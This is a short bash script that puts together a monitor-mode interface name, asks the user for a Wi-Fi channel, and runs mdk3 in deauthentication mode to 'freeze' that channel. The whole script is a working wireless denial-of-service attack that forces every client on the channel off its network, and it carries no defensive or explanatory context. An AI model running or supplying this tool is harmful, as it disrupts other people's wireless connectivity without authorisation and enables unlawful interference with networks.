#!/bin/bash
var1="wlan1"
var2="mon"
var3=$var1$var2
echo Choose a channel to Freeze
read ch
sudo mdk3 "$var3" d -c $ch -s 10